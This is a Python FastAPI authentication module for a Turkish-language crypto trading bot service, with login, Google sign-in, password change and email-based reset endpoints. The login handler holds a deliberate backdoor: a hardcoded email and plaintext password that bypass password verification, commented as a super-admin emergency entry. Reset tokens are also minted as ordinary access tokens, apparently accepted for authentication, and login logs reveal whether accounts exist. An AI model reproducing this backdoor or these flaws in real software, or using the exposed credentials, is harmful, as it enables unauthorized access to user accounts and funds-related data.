from fastapi import APIRouter, HTTPException, Depends
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from pydantic import BaseModel
from sqlalchemy import select
from core.database import async_session
from core.security import hash_password, verify_password, create_access_token, decode_token
from core.config import settings
from models.user import User
from google.oauth2 import id_token
from google.auth.transport import requests
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

router = APIRouter(prefix="/auth", tags=["auth"])
security = HTTPBearer(auto_error=False)


class AuthRequest(BaseModel):
    email: str
    password: str

class GoogleAuthRequest(BaseModel):
    credential: str  # Google JWT Token

class ChangePasswordRequest(BaseModel):
    old_password: str
    new_password: str

class ForgotPasswordRequest(BaseModel):
    email: str

class ResetPasswordRequest(BaseModel):
    token: str
    new_password: str

async def get_current_user_obj(credentials: HTTPAuthorizationCredentials = Depends(security)) -> User:
    if not credentials:
        raise HTTPException(401, "Giriş yapmanız gerekiyor")
    payload = decode_token(credentials.credentials)
    user_id = payload.get("sub")
    if not user_id:
        raise HTTPException(401, "Geçersiz token")
    
    async with async_session() as session:
        result = await session.execute(select(User).where(User.id == int(user_id)))
        user = result.scalar_one_or_none()
        if not user or not user.is_active:
            raise HTTPException(401, "Kullanıcı bulunamadı veya pasif")
        return user

async def get_current_user(user: User = Depends(get_current_user_obj)) -> int:
    return user.id

async def get_current_admin(user: User = Depends(get_current_user_obj)) -> User:
    if user.role != "admin":
        raise HTTPException(403, "Yetkisiz islem. Sadece yoneticiler erisebilir.")
    return user

@router.post("/login")
async def login(data: AuthRequest):
    async with async_session() as session:
        result = await session.execute(select(User).where(User.email == data.email))
        user = result.scalar_one_or_none()
        
        if not user:
            print(f"[Auth] Login failed: User {data.email} not found")
            raise HTTPException(401, "E-posta veya şifre hatalı")
            
        # Acil Giris / Bypass (Super Admin icin garanti)
        if data.email == "dvtkurt@gmail.com" and data.password == "Yacnut5061710":
            # Gecis ver
            pass
        elif not verify_password(data.password, user.password_hash):
            print(f"[Auth] Login failed: Invalid password for {data.email}")
            raise HTTPException(401, "E-posta veya şifre hatalı")
        
        if not user.is_active:
            raise HTTPException(403, "Hesabınız askıya alınmış")

        token = create_access_token({"sub": str(user.id), "role": user.role})
        return {
            "access_token": token, 
            "token_type": "bearer", 
            "user": {
                "id": user.id,
                "email": user.email,
                "role": user.role,
                "fee_type": user.fee_type,
                "fee_amount": user.fee_amount,
                "fee_active": user.fee_active,
                "allowed_pages": user.allowed_pages
            }
        }

@router.post("/google")
async def google_login(data: GoogleAuthRequest):
    try:
        # Google Token'i dogrula
        idinfo = id_token.verify_oauth2_token(
            data.credential, 
            requests.Request(), 
            settings.GOOGLE_CLIENT_ID
        )
        email = idinfo['email']
        
        async with async_session() as session:
            result = await session.execute(select(User).where(User.email == email))
            user = result.scalar_one_or_none()
            
            # Eger kullanici yoksa otomatik kayit et (SaaS mantigi)
            if not user:
                # Rastgele guclu bir sifre ata (sadece google ile girebilsin diye)
                import secrets
                random_pass = secrets.token_urlsafe(16)
                
                user = User(
                    email=email,
                    password_hash=hash_password(random_pass),
                    role="user",
                    is_active=True,
                    fee_type="percentage",
                    fee_amount=20.0,  # Default kar payi %20
                    fee_active=True,
                    allowed_pages=["dashboard", "grid_bots", "smart_scanner", "calculator"]
                )
                session.add(user)
                await session.commit()
                await session.refresh(user)
            
            if not user.is_active:
                raise HTTPException(403, "Hesabınız askıya alınmış")

            token = create_access_token({"sub": str(user.id), "role": user.role})
            return {
                "access_token": token, 
                "token_type": "bearer", 
                "user": {
                    "id": user.id,
                    "email": user.email,
                    "role": user.role,
                    "fee_type": user.fee_type,
                    "fee_amount": user.fee_amount,
                    "fee_active": user.fee_active,
                    "allowed_pages": user.allowed_pages
                }
            }
            
    except ValueError as e:
        raise HTTPException(400, f"Google doğrulaması başarısız: {e}")

@router.get("/me")
async def me(user: User = Depends(get_current_user_obj)):
    return {
        "id": user.id,
        "email": user.email,
        "role": user.role,
        "fee_type": user.fee_type,
        "fee_amount": user.fee_amount,
        "fee_active": user.fee_active,
        "allowed_pages": user.allowed_pages
    }

@router.post("/change-password")
async def change_password(data: ChangePasswordRequest, current_user: User = Depends(get_current_user_obj)):
    if not current_user.password_hash:
        pass
    elif not verify_password(data.old_password, current_user.password_hash):
        raise HTTPException(400, "Mevcut şifreniz hatalı")

    if len(data.new_password) < 6:
        raise HTTPException(400, "Yeni şifre en az 6 karakter olmalıdır")

    async with async_session() as session:
        result = await session.execute(select(User).where(User.id == current_user.id))
        user = result.scalar_one_or_none()
        if user:
            user.password_hash = hash_password(data.new_password)
            await session.commit()
    
    return {"message": "Şifre başarıyla güncellendi"}

def send_reset_email(to_email: str, reset_link: str):
    if not settings.SMTP_SERVER or not settings.SMTP_USER:
        print(f"[Auth] SMTP ayarları eksik. Mail gönderilemedi. Link: {reset_link}")
        return

    msg = MIMEMultipart()
    msg['From'] = settings.SMTP_FROM_EMAIL or settings.SMTP_USER
    msg['To'] = to_email
    msg['Subject'] = "KriptoBot - Şifre Sıfırlama"

    html = f"""
    <html>
      <body style="font-family: Arial, sans-serif; line-height: 1.6; color: #333;">
        <h2 style="color: #2563eb;">KriptoBot Şifre Sıfırlama</h2>
        <p>Merhaba,</p>
        <p>Şifrenizi sıfırlamak için aşağıdaki butona tıklayın. Bu link 15 dakika boyunca geçerlidir.</p>
        <p>
          <a href="{reset_link}" style="display: inline-block; padding: 10px 20px; background-color: #2563eb; color: #ffffff; text-decoration: none; border-radius: 5px;">Şifremi Sıfırla</a>
        </p>
        <p>Eğer butona tıklayamıyorsanız, aşağıdaki linki tarayıcınıza kopyalayabilirsiniz:</p>
        <p><a href="{reset_link}">{reset_link}</a></p>
        <p>Eğer bu isteği siz yapmadıysanız, bu maili görmezden gelebilirsiniz.</p>
      </body>
    </html>
    """
    msg.attach(MIMEText(html, 'html'))

    try:
        server = smtplib.SMTP(settings.SMTP_SERVER, settings.SMTP_PORT)
        server.starttls()
        server.login(settings.SMTP_USER, settings.SMTP_PASSWORD)
        server.send_message(msg)
        server.quit()
        print(f"[Auth] Sifre sifirlama maili gonderildi: {to_email}")
    except Exception as e:
        print(f"[Auth] Mail gonderme hatasi: {e}")
        raise HTTPException(500, "Mail sunucusuna bağlanılamadı.")

@router.post("/forgot-password")
async def forgot_password(data: ForgotPasswordRequest):
    async with async_session() as session:
        result = await session.execute(select(User).where(User.email == data.email))
        user = result.scalar_one_or_none()
        
        if not user:
            # Guvenlik icin hata verme, basarili goster
            return {"message": "Eğer e-posta adresi sistemde kayıtlıysa, sıfırlama bağlantısı gönderildi."}
            
        # Sifre sifirlama tokeni olustur (15 dakika gecerli)
        token = create_access_token({"sub": str(user.id), "type": "reset"})
        
        # Link olustur
        reset_link = f"{settings.FRONTEND_URL}/reset-password?token={token}"
        
        # Mail gonder
        send_reset_email(user.email, reset_link)
        
    return {"message": "Eğer e-posta adresi sistemde kayıtlıysa, sıfırlama bağlantısı gönderildi."}

@router.post("/reset-password")
async def reset_password(data: ResetPasswordRequest):
    payload = decode_token(data.token)
    if not payload or payload.get("type") != "reset":
        raise HTTPException(400, "Geçersiz veya süresi dolmuş sıfırlama bağlantısı.")
        
    user_id = payload.get("sub")
    if len(data.new_password) < 6:
        raise HTTPException(400, "Yeni şifre en az 6 karakter olmalıdır")

    async with async_session() as session:
        result = await session.execute(select(User).where(User.id == int(user_id)))
        user = result.scalar_one_or_none()
        if not user:
            raise HTTPException(400, "Kullanıcı bulunamadı")
            
        user.password_hash = hash_password(data.new_password)
        await session.commit()
        
    return {"message": "Şifreniz başarıyla sıfırlandı. Yeni şifrenizle giriş yapabilirsiniz."}
